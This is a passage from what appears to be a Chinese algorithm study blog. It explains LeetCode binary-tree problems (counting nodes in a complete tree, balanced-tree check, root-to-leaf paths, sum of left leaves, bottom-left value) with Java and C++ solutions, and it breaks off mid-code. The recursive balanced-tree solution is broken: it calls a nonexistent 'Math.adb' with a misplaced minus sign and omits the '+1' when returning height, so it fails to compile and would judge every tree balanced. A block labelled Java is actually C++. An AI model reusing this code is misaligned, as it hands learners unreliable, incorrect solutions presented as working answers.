href="#222-完全二叉树的节点个数" class="headerlink" title="222.完全二叉树的节点个数"></a>222.完全二叉树的节点个数</h2><p>给你一棵 完全二叉树 的根节点 root ，求出该树的节点个数。<br>完全二叉树 的定义如下：在完全二叉树中，除了最底层节点可能没填满外，其余每层节点数都达到最大值，并且最下面一层的节点都集中在该层最左边的若干位置。若最底层为第 h 层，则该层包含 1~ 2h 个节点。<br><img src="/2024/10/29/algorithm/binarytree/image-16.png"></p><p>在完全二叉树中，除了最底层节点可能没填满外，其余每层节点数都达到最大值，并且最下面一层的节点都集中在该层最左边的若干位置。<br><img src="/2024/10/29/algorithm/binarytree/image-17.png"></p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><h4 id="递归解法"><a href="#递归解法" class="headerlink" title="递归解法"></a>递归解法</h4><ol><li>确定递归函数的参数和返回值：参数就是传入树的根节点，返回就返回以该节点为根节点二叉树的节点数量，所以返回值为int类型。</li><li>确定终止条件：如果为空节点的话，就返回0，表示节点数为0。</li><li>确定单层递归的逻辑：先求它的左子树的节点数量，再求右子树的节点数量，最后取总和再加一 （加1是因为算上当前中间节点）就是目前节点为根节点的节点数量。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getNodesNum</span><span class="params">(TreeNode* cur)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (cur == NULL) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftNum</span> <span class="operator">=</span> getNodesNum(cur-&gt;left);      <span class="comment">// 左</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">rightNum</span> <span class="operator">=</span> getNodesNum(cur-&gt;right);    <span class="comment">// 右</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">treeNum</span> <span class="operator">=</span> leftNum + rightNum + <span class="number">1</span>;      <span class="comment">// 中</span></span><br><span class="line">        <span class="keyword">return</span> treeNum;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> <span class="title function_">countNodes</span><span class="params">(TreeNode* root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getNodesNum(root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> <span class="title function_">countNodes</span><span class="params">(TreeNode* root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == NULL) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + countNodes(root-&gt;left) + countNodes(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h4 id="迭代解法"><a href="#迭代解法" class="headerlink" title="迭代解法"></a>迭代解法</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countNodes</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> size = que.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                result++;   <span class="comment">// 记录节点数量</span></span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="完全二叉树思路解题"><a href="#完全二叉树思路解题" class="headerlink" title="完全二叉树思路解题"></a>完全二叉树思路解题</h4><p>完全二叉树只有两种情况，情况一：就是满二叉树，情况二：最后一层叶子节点没有满。</p><p>对于情况一，可以直接用 2^树深度 - 1 来计算，注意这里根节点深度为1。<br>对于情况二，分别递归左孩子，和右孩子，递归到某一深度一定会有左孩子或者右孩子为满二叉树，然后依然可以按照情况1来计算。</p><p><img src="/2024/10/29/algorithm/binarytree/image-18.png"><br><img src="/2024/10/29/algorithm/binarytree/image-19.png"></p><p>可以看出如果整个树不是满二叉树，就递归其左右孩子，直到遇到满二叉树为止，用公式计算这个子树（满二叉树）的节点数量。<br>在完全二叉树中，如果递归向左遍历的深度等于递归向右遍历的深度，那说明就是满二叉树。</p><p><img src="/2024/10/29/algorithm/binarytree/image-20.png"><br><img src="/2024/10/29/algorithm/binarytree/image-21.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countNodes</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> root.left;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> root.right;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftDepth</span> <span class="operator">=</span> <span class="number">0</span>, rightDepth = <span class="number">0</span>; <span class="comment">// 初始为0为了下面计算指数方便</span></span><br><span class="line">        <span class="keyword">while</span>(left != <span class="literal">null</span>)&#123;</span><br><span class="line">            left = left.left;</span><br><span class="line">            leftDepth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(right != <span class="literal">null</span>)&#123;</span><br><span class="line">            right = right.right;</span><br><span class="line">            rightDepth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(leftDepth == rightDepth)&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">2</span> &lt;&lt; leftDepth) - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> countNodes(root.left) + countNodes(root.right) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="110-平衡二叉树"><a href="#110-平衡二叉树" class="headerlink" title="110.平衡二叉树"></a>110.平衡二叉树</h2><p>给定一个二叉树，判断它是否是高度平衡的二叉树。<br>本题中，一棵高度平衡二叉树定义为：一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过1。<br><img src="/2024/10/29/algorithm/binarytree/image-22.png"><br>下面的不是了<br><img src="/2024/10/29/algorithm/binarytree/image-23.png"></p><p>二叉树节点的深度：指从根节点到该节点的最长简单路径边的条数。<br>二叉树节点的高度：指从该节点到叶子节点的最长简单路径边的条数。<br><img src="/2024/10/29/algorithm/binarytree/image-24.png"></p><p>下面主要讲解下用层序遍历来求高度的思路：<br>假设有一棵二叉树：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line"> / \</span><br><span class="line">4   5</span><br></pre></td></tr></table></figure><ul><li><strong>最大深度</strong>是 <code>3</code>，因为从根节点 <code>1</code> 到叶子节点 <code>4</code> 或 <code>5</code> 的路径长度是 <code>3</code>。</li><li><strong>高度</strong>在叶子节点 <code>4</code> 和 <code>5</code> 为 <code>0</code>，节点 <code>2</code> 的高度为 <code>1</code>，根节点 <code>1</code> 的高度为 <code>2</code>。</li></ul><p>层序遍历适合求<strong>最大深度</strong>。每遍历一层，深度加一。对于上面这棵树，层序遍历步骤如下：</p><ol><li><strong>第一层</strong>：根节点 <code>1</code>，深度为 <code>1</code>。</li><li><strong>第二层</strong>：节点 <code>2</code> 和 <code>3</code>，深度为 <code>2</code>。</li><li><strong>第三层</strong>：节点 <code>4</code> 和 <code>5</code>，深度为 <code>3</code>。</li></ol><p>层序遍历到叶子节点时，最大深度为 <code>3</code>。</p><p>后序遍历求高度，我们需要从叶子节点开始逐层向上计算。可以使用栈来模拟后序遍历，通过递归的方式来求每个节点的高度：</p><ol><li><strong>访问叶子节点</strong> <code>4</code> 和 <code>5</code>，高度为 <code>0</code>。</li><li><strong>回溯到节点</strong> <code>2</code>：<code>2</code> 的高度是 <code>max(4 的高度, 5 的高度) + 1 = 1</code>。</li><li><strong>访问节点</strong> <code>3</code>，高度为 <code>0</code>。</li><li><strong>回溯到根节点</strong> <code>1</code>：<code>1</code> 的高度是 <code>max(2 的高度, 3 的高度) + 1 = 2</code>。</li></ol><p>最终，根节点的高度为 <code>2</code>，这也是整个树的高度。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">// 递归法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isBalanced</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getHeight(root) != -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftHeight</span> <span class="operator">=</span> getHeight(root.left);</span><br><span class="line">        <span class="keyword">if</span>(leftHeight == -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightHeight</span> <span class="operator">=</span> getHeight(root.right);</span><br><span class="line">        <span class="keyword">if</span>(rightHeight == -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 左右子树高度差大于1就不是平衡树了</span></span><br><span class="line">        <span class="keyword">if</span>(Math.adb(leftHeight, - rightHeight) &gt; <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.max(leftHeight, rightHeight);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 迭代法，效率较低，计算高度时会重复遍历</span></span><br><span class="line"><span class="comment">     * 时间复杂度：O(n^2)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isBalanced</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(root != <span class="literal">null</span> || !stack.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">while</span>(root != <span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(root);</span><br><span class="line">                root = root.left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">inNode</span> <span class="operator">=</span> stack.peek();</span><br><span class="line">            <span class="comment">// 右节点为null或已遍历过</span></span><br><span class="line">            <span class="keyword">if</span>(inNode.right == <span class="literal">null</span> || inNode.right == pre)&#123;</span><br><span class="line">                <span class="comment">// 比较左右子树高度差，输出</span></span><br><span class="line">                <span class="keyword">if</span>(Math.abs(getHeight(inNode.left) - getHeight(inNode.right)) &gt; <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                stack.pop();</span><br><span class="line">                pre = inNode;</span><br><span class="line">                root = <span class="literal">null</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                root = inNode.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 层序遍历，求结点的高度</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Deque&lt;TreeNode&gt; deque = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        deque.offer(root);</span><br><span class="line">        <span class="type">int</span> <span class="variable">depth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!deque.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> deque.size();</span><br><span class="line">            depth++;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i= <span class="number">0</span>; i &lt; size; i++)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">poll</span> <span class="operator">=</span> deque.poll();</span><br><span class="line">                <span class="keyword">if</span>(poll.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                    deque.offer(poll.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(poll.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                    deque.offer(poll.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="257-二叉树的所有路径"><a href="#257-二叉树的所有路径" class="headerlink" title="257. 二叉树的所有路径"></a>257. 二叉树的所有路径</h2><p>给你一个二叉树的根节点 root ，按 任意顺序 ，返回所有从根节点到叶子节点的路径。</p><p>这道题目要求从根节点到叶子的路径，所以需要前序遍历，这样才方便让父节点指向孩子节点，找到对应的路径。<br><img src="/2024/10/29/algorithm/binarytree/image-25.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">binaryTreePaths</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; paths = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        traversal(root, paths, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">traversal</span><span class="params">(TreeNode root, List&lt;Integer&gt; paths, List&lt;String&gt; res)</span>&#123;</span><br><span class="line">        paths.add(root.val); <span class="comment">// 前序遍历</span></span><br><span class="line">        <span class="comment">// 遇到叶子结点</span></span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// 输出</span></span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; paths.size()-<span class="number">1</span>; i++)&#123;</span><br><span class="line">                sb.append(paths.get(i)).append(<span class="string">&quot;-&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(paths.get(paths.size() - <span class="number">1</span>)); <span class="comment">// 记录最后一个结点</span></span><br><span class="line">            res.add(sb.toString());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 递归和回溯同时进行所以要在一个花括号里</span></span><br><span class="line">        <span class="keyword">if</span>(root.left != <span class="literal">null</span>)&#123;</span><br><span class="line">            traversal(root.left, paths, res);</span><br><span class="line">            paths.remove(paths.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.right != <span class="literal">null</span>)&#123;</span><br><span class="line">            traversal(root.right, paths, res);</span><br><span class="line">            paths.remove(paths.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;String&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">binaryTreePaths</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        deal(root, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deal</span><span class="params">(TreeNode node, String s)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(node.left == <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>)&#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(s).append(node.val).toString());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(s).append(node.val).append(<span class="string">&quot;-&gt;&quot;</span>).toString();</span><br><span class="line">        deal(node.left, tmp);</span><br><span class="line">        deal(node.right, tmp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="404-左叶子之和"><a href="#404-左叶子之和" class="headerlink" title="404.左叶子之和"></a>404.左叶子之和</h2><p>计算给定二叉树的所有左叶子之和。<br><img src="/2024/10/29/algorithm/binarytree/image-26.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumOfLeftLeaves</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftValue</span> <span class="operator">=</span> sumOfLeftLeaves(root.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightValue</span> <span class="operator">=</span> sumOfLeftLeaves(root.right);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">midValue</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(root.left != <span class="literal">null</span> &amp;&amp; root.left.left == <span class="literal">null</span> &amp;&amp; root.left.right == <span class="literal">null</span>)&#123;</span><br><span class="line">            midValue = root.left.val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> midValue + leftValue + rightValue;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 迭代法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumOfLeftLeaves</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.add(root);</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">            <span class="keyword">if</span>(node.left != <span class="literal">null</span> &amp;&amp; node.left.left ==<span class="literal">null</span> &amp;&amp; node.left.right == <span class="literal">null</span>)&#123;</span><br><span class="line">                result += node.left.val;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.left != <span class="literal">null</span>) stack.add(node.left);</span><br><span class="line">            <span class="keyword">if</span>(node.right != <span class="literal">null</span>) stack.add(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="513-找树左下角的值"><a href="#513-找树左下角的值" class="headerlink" title="513.找树左下角的值"></a>513.找树左下角的值</h2><p>给定一个二叉树的 根节点 root，请找出该二叉树的 最底层 最左边 节点的值。<br><img src="/2024/10/29/algorithm/binarytree/image-27.png" alt="这张图是7"></p><p>递归法求解时要同时记录深度，使用层次遍历更为方便</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 递归法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">Deep</span> <span class="operator">=</span> -<span 